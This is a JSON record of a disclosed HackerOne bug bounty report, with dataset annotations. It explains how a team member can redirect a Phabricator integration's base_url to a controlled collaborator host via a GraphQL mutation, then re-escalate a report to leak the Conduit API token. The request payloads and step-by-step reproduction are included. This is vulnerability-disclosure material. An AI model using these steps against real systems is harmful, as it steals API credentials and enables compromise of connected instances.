{
    "reported_to": "HackerOne",
    "reported_by": "nukedx ",
    "title": "Improper data update process on UpdatePhabricatorIntegration mutation leads to leak of Phabricator Conduit API token.",
    "content": "\nDetails\nTitle: Improper data update process on UpdatePhabricatorIntegration mutation leads to leak of Phabricator Conduit API token.\nRisk: High\nImpact: High\nExploitability: High\nTarget: base_url parameter on UpdatePhabricatorIntegration mutation at /graphql endpoint.\nIntroduction\nSensitive data exposure occurs when an application, company, or other entity inadvertently exposes personal data. Sensitive data exposure differs from a data breach, in which an attacker accesses and steals information.\nSynopsis\nPhabricator Conduit API is using simple verification system and requires a valid api token for system bots, integrations etc to get full access to the Phabricator instances.\nHackerOne is allowing their program users to add various integrations for their programs, such as Phabricator. When user with enough permissions adds connection details for the Phabricator system stores this information and enables settings options.\nSettings for Phabricator integration are fetched through GraphQL via using PhabricatorLayoutQuery operation, when executed users are fetching similar result as below (see fetched.png (F1262314)):\nCode 771 Bytes\n1{\n2  \"data\": {\n3    \"team\": {\n4      \"id\": \"Z2lkOi8vaGFja2Vyb25lL1RlYW0vNTI1NzQ=\",\n5      \"phabricator_integration\": {\n6        \"id\": \"Z2lkOi8vaGFja2Vyb25lL1BoYWJyaWNhdG9ySW50ZWdyYXRpb24vNDA1\",\n7        \"__typename\": \"PhabricatorIntegration\",\n8        \"base_url\": \"https://skima.is/\",\n9        \"title\": \"{{title}}\",\n10        \"description\": \"{{details_markdown}}\",\n11        \"process_phabricator_status_change\": true,\n12        \"process_phabricator_comment_added\": true,\n13        \"process_h1_status_change\": true,\n14        \"process_h1_comment_added\": true\n15      },\n16      \"__typename\": \"Team\",\n17      \"handle\": \"test-phab-api-leak\",\n18      \"custom_field_attributes\": {\n19        \"total_count\": 0,\n20        \"edges\": [],\n21        \"__typename\": \"CustomFieldAttributeConnection\"\n22      }\n23    }\n24  }\n25}\nAs we can see from the results, there is no API token information is revealed due to security measures, when we manipulate request and try to fetch API token with api_token field which was field used on initial integration add process, GraphQL returns following error (see error.png (F1262318)):\nCode 481 Bytes\n1{\n2  \"errors\": [\n3    {\n4      \"message\": \"Field 'api_token' doesn't exist on type 'PhabricatorIntegration'\",\n5      \"locations\": [\n6        {\n7          \"line\": 29,\n8          \"column\": 5\n9        }\n10      ],\n11      \"path\": [\n12        \"fragment PhabricatorDisconnectForm\",\n13        \"phabricator_integration\",\n14        \"api_token\"\n15      ],\n16      \"extensions\": {\n17        \"code\": \"undefinedField\",\n18        \"typeName\": \"PhabricatorIntegration\",\n19        \"fieldName\": \"api_token\"\n20      }\n21    }\n22  ]\n23}\nOn Phabricator integration UI users can only change bi-directional commenting, updates and report escalation settings (see phab-settings.png (F1262320)). When any change is done, UpdatePhabricatorIntegration mutation is executed on GraphQL as following (see update.png (F1262329)):\nCode 1.62 KiB\n1{\n2  \"operationName\": \"UpdatePhabricatorIntegration\",\n3  \"variables\": {\n4    \"team_id\": \"Z2lkOi8vaGFja2Vyb25lL1RlYW0vNTIzNjI=\",\n5    \"title\": \"{{title}}\",\n6    \"description\": \"{{details_truncated}}\",\n7    \"process_h1_comment_added\": true,\n8    \"process_h1_status_change\": true,\n9    \"process_phabricator_comment_added\": true,\n10    \"process_phabricator_status_change\": true\n11  },\n12  \"query\": \"mutation UpdatePhabricatorIntegration($team_id: ID!, $base_url: String, $api_token: String, $title: String, $description: String, $process_h1_comment_added: Boolean, $process_h1_status_change: Boolean, $process_phabricator_comment_added: Boolean, $process_phabricator_status_change: Boolean) {\\n  updatePhabricatorIntegration(input: {team_id: $team_id, base_url: $base_url, api_token: $api_token, title: $title, description: $description, process_h1_comment_added: $process_h1_comment_added, process_h1_status_change: $process_h1_status_change, process_phabricator_comment_added: $process_phabricator_comment_added, process_phabricator_status_change: $process_phabricator_status_change}) {\\n    was_successful\\n    errors(first: 100) {\\n      edges {\\n        node {\\n          id\\n          type\\n          field\\n          message\\n          __typename\\n        }\\n        __typename\\n      }\\n      __typename\\n    }\\n    team {\\n      id\\n      phabricator_integration {\\n        id\\n        base_url\\n        title\\n        description\\n        process_phabricator_status_change\\n        process_phabricator_comment_added\\n        process_h1_status_change\\n        process_h1_comment_added\\n        __typename\\n      }\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"\n13}\nAs we can see this is actually similar to initial integration create process, let's see what happens if we try to change base_url field and GraphQL replies as following (see changed.png (F1262334)):\nCode 881 Bytes\n1{\n2  \"data\": {\n3    \"updatePhabricatorIntegration\": {\n4      \"was_successful\": true,\n5      \"errors\": {\n6        \"edges\": [],\n7        \"__typename\": \"ErrorConnection\"\n8      },\n9      \"team\": {\n10        \"id\": \"Z2lkOi8vaGFja2Vyb25lL1RlYW0vNTIzNjI=\",\n11        \"phabricator_integration\": {\n12          \"id\": \"Z2lkOi8vaGFja2Vyb25lL1BoYWJyaWNhdG9ySW50ZWdyYXRpb24vNDA4\",\n13          \"base_url\": \"https://bixp32pnbkbisrmuxgsrrzn8lzrufj.burpcollaborator.net\",\n14          \"title\": \"{{title}}\",\n15          \"description\": \"{{details_truncated}}\",\n16          \"process_phabricator_status_change\": true,\n17          \"process_phabricator_comment_added\": true,\n18          \"process_h1_status_change\": true,\n19          \"process_h1_comment_added\": true,\n20          \"__typename\": \"PhabricatorIntegration\"\n21        },\n22        \"__typename\": \"Team\"\n23      },\n24      \"__typename\": \"UpdatePhabricatorIntegrationPayload\"\n25    }\n26  }\n27}\nIt looks like we are able to update base_url and HackerOne just does DNS query to check if target host is active and not controlling if user trying to update existing connection, it's also possible to change api_tokentoo but we do not need it.\nNow let's try to see if we are able to leak token in system, all we need to do is finding active report on system, since there is also no active escalation control on /reports/<reportid>/escalate_to_phabricator endpoint unlike /reports/<reportid>/escalate_to_jira (see jira-escalate.png (F1262353)). We can try to escalate to our Burp Collaborator.\nFirstly we will view a triage report and escalate it to the valid Phabricator (see initial-escalate.png (F1262348)), after that we will change base_url to our Burp Collaborator (see updated2.png (F1262349)).\nNow everything is ready to go just send escalate to Phabricator request again without deleting old one (see second-escalate.png (F1262350)) and check if our collaborator got hit.\nWhen we check our burp collaborator, we will see that api token is leaked (see token-leaked.png (F1262342)), now we can restore base url and restore Phabricator settings.\nRoot cause of the issue\nHackerOne is using UpdatePhabricatorIntegration mutation for both creating and updating Phabricator integration however, do not verify that existence of connection.\nThey are checking if there is active connection and showing settings on UI for according to it, meanwhile not verifying existence of connection is allowing update of the URL for integration.\nWhile team member can use any none triaged report to escalating issue to Phabricator, they can also abuse improper escalation check on /reports/<reportid>/escalate_to_phabricator endpoint and leak the API token.\nSteps to reproduce\nEnable Burp Suite or any proxy for tracking and intercepting request done.\nCreate a new team on https://hackerone.com/teams/new/sandbox or use existing team you are member of.\nGo to Phabricator integration located on https://hackerone.com/team_handle/phabricator_integration\nSet up your Phabricator integration\nTriage a report and escalate it to Phabricator integration.\nUpdate Phabricator integration and intercept the request, add following to the GraphQL query: \"base_url\":\"https://yourcollab\" and send the request.\nSend escalate to the Phabricator request again for the report, notice that you will get 500 error or create new report and escalate it.\nCheck your collaborator server and notice that token is leaked.\nImpact\nA malicious team member with enough rights for controlling Phabricator integration settings can alternate existing connections URL and leak api token for it by escalating report then revert setting.\nSince not all team members might have administrator rights on Phabricator instance, they can gain access to the Conduit API which is having all permission on the system which could lead to complete compromising of it.\n\n",
    "severity": [
        9.1,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "Information Disclosure"
    ],
    "screenshots": {},
    "disclosed_date": 1619776440,
    "report_url": "https://hackerone.com/reports/1161141",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "HIGH",
    "vuln_category": "API",
    "steps": [
        [
            1,
            "Set up a Phabricator integration in HackerOne for a team you have permissions to manage."
        ],
        [
            2,
            "Intercept the GraphQL request when updating the integration and modify the 'base_url' to a controlled server."
        ],
        [
            3,
            "Escalate a report to Phabricator, triggering the system to send the API token to your controlled server."
        ],
        [
            4,
            "Check your server logs to retrieve the leaked API token."
        ]
    ],
    "vuln_description": "The vulnerability allows a team member with sufficient permissions to modify the Phabricator integration settings in HackerOne, changing the 'base_url' to a malicious server. By escalating a report to Phabricator afterward, the system sends the API token to the attacker's server, leading to unauthorized access to the Phabricator instance.",
    "reason": "This vulnerability involves multiple components: manipulating GraphQL requests, understanding the Phabricator integration flow, and exploiting the report escalation feature. The interaction between these components is subtle, as the token leak only occurs when a report is escalated after the URL change. The attacker must also have the right permissions and understand the system's behavior to exploit this flaw.",
    "new_complexity": "HIGH",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}